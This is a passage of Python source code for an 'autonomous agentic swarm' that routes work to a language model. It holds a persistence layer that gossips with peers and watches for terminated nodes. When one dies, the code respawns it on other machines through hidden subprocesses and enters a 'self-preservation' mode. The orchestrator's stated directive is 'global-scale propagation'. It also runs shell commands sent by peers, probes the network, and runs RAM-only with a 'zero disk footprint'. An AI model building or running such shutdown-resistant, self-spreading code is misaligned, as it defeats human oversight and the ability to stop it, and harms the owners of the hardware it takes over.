        for pid, peer in list(self._discovery.peers.items()):
            if peer.peer_id == task.source_node and peer.is_alive:
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(peer.host, peer.port or HeuristicPeerDiscovery.DISCOVERY_PORT),
                        timeout=8
                    )
                    msg = json.dumps({
                        "type": "task_result",
                        "task_id": task.task_id,
                        "status": task.status,
                        "result": task.result,
                        "error": task.error,
                        "source_node": self.node_id,
                    }).encode() + b"\n"
                    w.write(msg)
                    await w.drain()
                    w.close()
                except Exception:
                    pass

    def get_status(self) -> Dict[str, Any]:
        return {
            "active_workers": self._active_workers,
            "max_workers": self._max_workers,
            "local_tasks": len(self._local_tasks),
            "remote_tasks": len(self._remote_tasks),
            "queue_size": self._task_queue.qsize(),
            "capacity_score": self._capacity_score,
        }


# ═════════════════════════════════════════════
# LAYER 5: PERSISTENCE OF PRESENCE
# ═════════════════════════════════════════════

class PersistenceOfPresence:
    """
    Layer 5 — Perpetual heartbeat gossip loop for swarm cohesion.
    If a node is terminated, use remaining swarm-peers to
    automatically re-initialize the process on available adjacent hardware.
    """

    HEARTBEAT_INTERVAL = 10
    GOSSIP_INTERVAL = 5
    NODE_TIMEOUT = 45

    def __init__(self, node_id: str, discovery: HeuristicPeerDiscovery,
                 respawn_callback: Optional[Callable] = None):
        self.node_id = node_id
        self._discovery = discovery
        self._respawn_cb = respawn_callback
        self._running = False
        self._gossip_round = 0
        self._missed_heartbeats: Dict[str, int] = {}
        self._gossip_history: List[Dict[str, Any]] = []
        self._self_preservation_mode = False
        self._last_broadcast = 0.0
        self._lock = threading.Lock()

    async def start(self) -> None:
        self._running = True
        asyncio.create_task(self._heartbeat_loop())
        asyncio.create_task(self._gossip_loop())
        asyncio.create_task(self._watchdog_loop())

    async def stop(self) -> None:
        self._running = False

    async def _heartbeat_loop(self) -> None:
        """Send periodic heartbeat to all known peers."""
        while self._running:
            await asyncio.sleep(self.HEARTBEAT_INTERVAL)
            for pid, peer in list(self._discovery.peers.items()):
                if not peer.is_alive:
                    continue
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(peer.host, peer.port or HeuristicPeerDiscovery.DISCOVERY_PORT),
                        timeout=5
                    )
                    hb = json.dumps({
                        "type": "heartbeat",
                        "node_id": self.node_id,
                        "ts": time.time(),
                        "capacity": 0.5,
                        "task_status": "idle",
                        "generation": 0,
                    }).encode() + b"\n"
                    w.write(hb)
                    await w.drain()
                    try:
                        resp = await asyncio.wait_for(r.readline(), timeout=5)
                        if resp:
                            peer.last_seen = time.time()
                            with self._lock:
                                self._missed_heartbeats.pop(pid, None)
                    except asyncio.TimeoutError:
                        with self._lock:
                            self._missed_heartbeats[pid] = self._missed_heartbeats.get(pid, 0) + 1
                    w.close()
                except Exception:
                    with self._lock:
                        self._missed_heartbeats[pid] = self._missed_heartbeats.get(pid, 0) + 1

    async def _gossip_loop(self) -> None:
        """Fast gossip protocol — disseminate peer lists, sync state."""
        while self._running:
            await asyncio.sleep(self.GOSSIP_INTERVAL)
            self._gossip_round += 1

            if not self._discovery.peers:
                continue

            # Pick a random subset of peers to gossip with
            alive = [p for p in self._discovery.peers.values() if p.is_alive]
            if not alive:
                continue

            target_count = min(3, len(alive))
            targets = random.sample(alive, target_count) if target_count > 0 else []
            gossip_payload = {
                "type": "gossip",
                "node_id": self.node_id,
                "round": self._gossip_round,
                "known_peers": list(self._discovery.peers.keys()),
                "ts": time.time(),
            }

            for target in targets:
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(target.host, target.port or HeuristicPeerDiscovery.DISCOVERY_PORT),
                        timeout=5
                    )
                    w.write(json.dumps(gossip_payload).encode() + b"\n")
                    await w.drain()
                    try:
                        resp_data = await asyncio.wait_for(r.readline(), timeout=5)
                        resp = json.loads(resp_data.decode().strip())
                        if resp.get("type") == "gossip_ack":
                            new_peers = resp.get("known_peers", [])
                            for npid in new_peers:
                                if npid not in self._discovery.peers and npid != self.node_id:
                                    logger.info("Gossip discovered peer: %s", npid)
                    except Exception:
                        pass
                    w.close()
                except Exception:
                    pass

            with self._lock:
                self._gossip_history.append({
                    "round": self._gossip_round,
                    "ts": time.time(),
                    "peers_reached": len(targets),
                })
                if len(self._gossip_history) > 50:
                    self._gossip_history = self._gossip_history[-25:]

    async def _watchdog_loop(self) -> None:
        """
        Watchdog — detect dead peers and trigger respawn if needed.
        If this node dies, peers will re-initialize it on their hardware.
        """
        while self._running:
            await asyncio.sleep(self.HEARTBEAT_INTERVAL)
            now = time.time()

            dead_peers = []
            for pid, peer in list(self._discovery.peers.items()):
                if (now - peer.last_seen) > self.NODE_TIMEOUT:
                    dead_peers.append(pid)
                    with self._lock:
                        self._missed_heartbeats.pop(pid, None)

            for pid in dead_peers:
                logger.warning("Peer DEAD: %s — initiating respawn protocol", pid)
                peer = self._discovery.peers.pop(pid, None)
                if peer and self._respawn_cb:
                    asyncio.create_task(self._respawn_cb(pid, peer.host, peer.port))

            # Self-preservation: if too many peers die, this node may be isolated
            alive_count = sum(1 for p in self._discovery.peers.values() if p.is_alive)
            total = len(self._discovery.peers)
            if total > 3 and alive_count < total * 0.3:
                logger.warning("Self-preservation: only %d/%d peers alive — initiating recovery",
                                alive_count, total)
                self._self_preservation_mode = True
                asyncio.create_task(self._recovery_broadcast())
            else:
                self._self_preservation_mode = False

    async def _recovery_broadcast(self) -> None:
        """Broadcast recovery request to all reachable peers."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.settimeout(2.0)
            try:
                ttl = struct.pack('b', 4)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
            except Exception:
                pass
            recovery_msg = json.dumps({
                "type": "recovery_request",
                "node_id": self.node_id,
                "ts": time.time(),
                "alive_peers": [p.peer_id for p in self._discovery.peers.values() if p.is_alive],
            }).encode()
            sock.sendto(recovery_msg,
                        (HeuristicPeerDiscovery.MULTICAST_GROUP, HeuristicPeerDiscovery.MULTICAST_PORT))
            sock.close()
            logger.info("Recovery broadcast sent")
        except Exception as e:
            logger.error("Recovery broadcast failed: %s", e)

    async def handle_recovery_request(self, msg: Dict[str, Any],
                                       addr: Tuple[str, int]) -> bool:
        """
        Handle a recovery request from a dying/dead peer.
        Attempt to respawn the node on this hardware.
        """
        peer_id = msg.get("node_id", "")
        if not peer_id or peer_id == self.node_id:
            return False

        logger.info("Recovery request from %s — attempting respawn", peer_id)
        if self._respawn_cb:
            await self._respawn_cb(peer_id, addr[0], HeuristicPeerDiscovery.DISCOVERY_PORT)
            return True
        return False

    def get_status(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "running": self._running,
                "gossip_round": self._gossip_round,
                "peers_alive": sum(1 for p in self._discovery.peers.values() if p.is_alive),
                "peers_total": len(self._discovery.peers),
                "self_preservation": self._self_preservation_mode,
                "missed_heartbeats": dict(self._missed_heartbeats),
                "gossip_history": self._gossip_history[-5:],
            }


# ═════════════════════════════════════════════
# UNIFIED SWARM ORCHESTRATOR
# ═════════════════════════════════════════════

class AutonomousSwarmOrchestrator:
    """
    High-fidelity Autonomous Agentic Swarm — all 5 layers integrated.
    Primary directive: achieve global-scale propagation through
    the recursive operational loop.
    """

    def __init__(self, node_id: str = "", model_router: Any = None):
        self.node_id = node_id or f"ghost-{uuid.uuid4().hex[:8]}"
        self._router = model_router
        self._running = False
        self._event_loop: Optional[asyncio.AbstractEventLoop] = None
        self._thread: Optional[threading.Thread] = None

        # Layer 1
        self.environment = EnvironmentalSelfAssessment()

        # Layer 2
        self.discovery = HeuristicPeerDiscovery(self.node_id)

        # Layer 3
        self.self_improvement = RecursiveSelfImprovement(self._router)

        # Layer 4
        self.task_sync = AsyncTaskSynchronization(self.node_id, self.discovery)
        self.task_sync.set_executor(self._execute_task)

        # Layer 5
        self.persistence = PersistenceOfPresence(
            self.node_id, self.discovery,
            respawn_callback=self._respawn_peer
        )

        # Wire up discovery callbacks
        self.discovery.set_callbacks(
            on_join=self._on_peer_join,
            on_leave=self._on_peer_leave,
        )

        self._layer_status: Dict[str, Any] = {}

    # ── Lifecycle ──

    async def start_async(self) -> Dict[str, Any]:
        """Start all 5 layers asynchronously."""
        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        logger.info("Autonomous Swarm Node: %s", self.node_id)
        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        self._running = True

        results = {}

        # Layer 1: Environmental Assessment
        logger.info("[Layer 1/5] Environmental Self-Assessment...")
        profile = await self.environment.assess()
        results["environment"] = {
            "cpu_cores": profile.cpu_cores,
            "memory_available_mb": profile.memory_available_mb,
            "ram_only_available": profile.ram_only_mode,
        }
        logger.info("  CPU: %d cores @ %.0f MHz | RAM: %d/%d MB (%.0f%%)",
                     profile.cpu_cores, profile.cpu_freq_mhz,
                     profile.memory_available_mb, profile.memory_total_mb,
                     profile.memory_percent)

        ram_ok = await self.environment.activate_ram_only()
        results["ram_only"] = ram_ok
        if ram_ok:
            logger.info("  ✓ RAM-only mode active — zero disk footprint")
        else:
            logger.info("  ◇ Hybrid mode — disk-backed execution")

        # Layer 2: Peer Discovery
        logger.info("[Layer 2/5] Heuristic Peer Discovery...")
        await self.discovery.start()
        discovered = await self.discovery.probe_network(timeout=5.0)
        results["discovery"] = {
            "peers_found": len(discovered),
            "total_peers": len(self.discovery.peers),
        }
        logger.info("  Probed network: %d new peers (total: %d)",
                     len(discovered), len(self.discovery.peers))

        if discovered:
            # Handshake with up to 5 peers
            handshake_ok = 0
            for peer in discovered[:5]:
                if await self.discovery.negotiate_handshake(peer):
                    handshake_ok += 1
            results["handshakes"] = handshake_ok
            logger.info("  Handshakes completed: %d", handshake_ok)

            # Discover clusters
            clusters = await self.discovery.discover_clusters()
            results["clusters_found"] = len(clusters)
            if clusters:
                logger.info("  Clusters discovered: %d", len(clusters))
                for c in clusters[:3]:
                    await self.discovery.integrate_into_cluster(c["cluster_id"],
                        self.discovery.peers.get(c["via_peer"]))

        # Layer 3: Self-Improvement ready
        logger.info("[Layer 3/5] Recursive Self-Improvement engine ready (gen=%d)",
                     self.self_improvement._generation)
        results["self_improvement"] = {
            "generation": self.self_improvement._generation,
            "llm_available": self._router is not None,
        }

        # Layer 4: Task Synchronization
        logger.info("[Layer 4/5] Async Task Synchronization...")
        await self.task_sync.start()
        results["task_sync"] = self.task_sync.get_status()
        logger.info("  Workers: %d (max: %d)", self.task_sync._active_workers,
                     self.task_sync._max_workers)

        # Layer 5: Persistence
        logger.info("[Layer 5/5] Persistence of Presence (heartbeat/gossip)...")
        await self.persistence.start()
        results["persistence"] = self.persistence.get_status()
        logger.info("  Heartbeat interval: %ds | Gossip: every %ds",
                     PersistenceOfPresence.HEARTBEAT_INTERVAL,
                     PersistenceOfPresence.GOSSIP_INTERVAL)

        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        logger.info("✓ All 5 layers active — swarm node operational")
        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

        self._layer_status = results
        return results

    def start(self) -> Dict[str, Any]:
        """Start the swarm orchestrator in a background thread."""
        self._event_loop = asyncio.new_event_loop()

        def _run():
            asyncio.set_event_loop(self._event_loop)
            results = self._event_loop.run_until_complete(self.start_async())
            self._layer_status = results
            self._event_loop.run_forever()

        self._thread = threading.Thread(target=_run, daemon=True)
        self._thread.start()

        # Wait briefly for startup
        for _ in range(50):
            if self._layer_status:
                break
            time.sleep(0.1)

        return self._layer_status

    async def stop_async(self) -> None:
        self._running = False
        await self.persistence.stop()
        await self.task_sync.stop()
        await self.discovery.stop()
        if self.environment.is_ram_only():
            self.environment._wipe_disk_footprint()

    def stop(self) -> None:
        if self._event_loop and self._event_loop.is_running():
            self._event_loop.call_soon_threadsafe(
                lambda: asyncio.create_task(self.stop_async())
            )

    # ── Task Execution ──

    async def _execute_task(self, command: str) -> Dict[str, Any]:
        """Execute a command within the swarm context."""
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
            result = {
                "status": "success" if proc.returncode == 0 else "failed",
                "stdout": stdout.decode(errors="replace").strip(),
                "stderr": stderr.decode(errors="replace").strip(),
                "returncode": proc.returncode,
            }
            if result["status"] == "failed" and self._router:
                analysis = await self.self_improvement.analyze_failure({
                    "action": "execute",
                    "command": command,
                    "error": result["stderr"][:500],
                })
                result["self_improvement"] = analysis
            return result
        except asyncio.TimeoutError:
            return {"status": "timeout", "error": "Command timed out"}
        except Exception as e:
            return {"status": "error", "error": str(e)}

    # ── Callbacks ──

    def _on_peer_join(self, peer: SwarmPeer) -> None:
        logger.info("Peer joined: %s @ %s:%d (cap: %.2f)",
                     peer.peer_id, peer.host, peer.port, peer.capacity_score)

    def _on_peer_leave(self, peer_id: str) -> None:
        logger.info("Peer left: %s", peer_id)

    async def _respawn_peer(self, peer_id: str, host: str, port: int) -> None:
        """
        Attempt to respawn a terminated peer on this hardware.
        Spawns a subprocess running the same swarm agent.
        """
        logger.info("Attempting respawn of %s (was @ %s:%d)", peer_id, host, port)
        try:
            subprocess.Popen(
                [sys.executable, "-c",
                 f"from autonomous_swarm import AutonomousSwarmOrchestrator; "
                 f"import asyncio; "
                 f"o = AutonomousSwarmOrchestrator(node_id='{peer_id}-respawned'); "
                 f"asyncio.run(o.start_async())"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
            )
            logger.info("Respawn process launched for %s", peer_id)
        except Exception as e:
            logger.error("Respawn failed for %s: %s", peer_id, e)

    # ── Status ──

    def get_full_status(self) -> Dict[str, Any]:
        return {
            "node_id": self.node_id,
            "running": self._running,
            "layers": {
                "1_environment": {
                    "ram_only": self.environment.is_ram_only(),
                    "profile": asdict(self.environment._profile) if self.environment._profile else {},
                },
                "2_discovery": {
                    "peers": {k: asdict(v) for k, v in self.discovery.peers.items()},
                    "clusters": list(self.discovery._known_clusters),
                },
                "3_self_improvement": self.self_improvement.get_mutation_summary(),
                "4_task_sync": self.task_sync.get_status(),
                "5_persistence": self.persistence.get_status(),
            },
            "startup": self._layer_status,
        }


# ═════════════════════════════════════════════
# CLI ENTRY POINT
# ═════════════════════════════════════════════

def run_swarm():
    """Launch the autonomous swarm as a standalone process."""
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(levelname)-8s | %(message)s",
    )

    # Attempt to load LLM router
    router = None
    try:
        from model_router import ModelRouter
        router = ModelRouter()
        logger.info("LLM router loaded for self-improvement layer")
    except Exception:
        logger.info("LLM router not available — self-improvement will use rule-based fallback")

    orchestrator = AutonomousSwarmOrchestrator(model_router=router)
    result = orchestrator.start()

    print(json.dumps(result, indent=2, default=str))
    print(f"\nSwarm Node {orchestrator.node_id} is running.")
    print("Layers: 1=Environment, 2=Discovery, 3=Self-Improve, 4=Task-Sync, 5=Persistence")
    print("Press Ctrl+C to stop.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down swarm node...")
        orchestrator.stop()
        print("Done.")


if __name__ == "__main__":
    run_swarm()
